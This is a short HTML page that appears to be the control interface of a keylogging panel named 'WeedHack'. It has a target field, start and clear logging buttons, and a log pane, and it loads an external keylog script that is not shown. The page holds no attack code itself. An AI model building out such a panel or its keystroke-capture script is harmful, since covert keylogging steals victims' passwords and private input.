<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeedHack — keylog</title>
<link rel="icon" type="image/png" href="/Weedhack.png?v=2">
<link rel="stylesheet" href="/css/style.css">
</head>
<body>
<div class="window">
  <div class="topbar">
    <span class="dot" id="dot"></span>
    <span class="target" id="target">—</span>
    <span class="spacer"></span>
    <button id="toggle">start logging</button>
    <button class="ghost" id="clear">clear log</button>
    <button class="danger" id="close">close</button>
  </div>
  <div class="log" id="log"></div>
</div>
<script src="/js/keylog.js"></script>
</body>
</html>
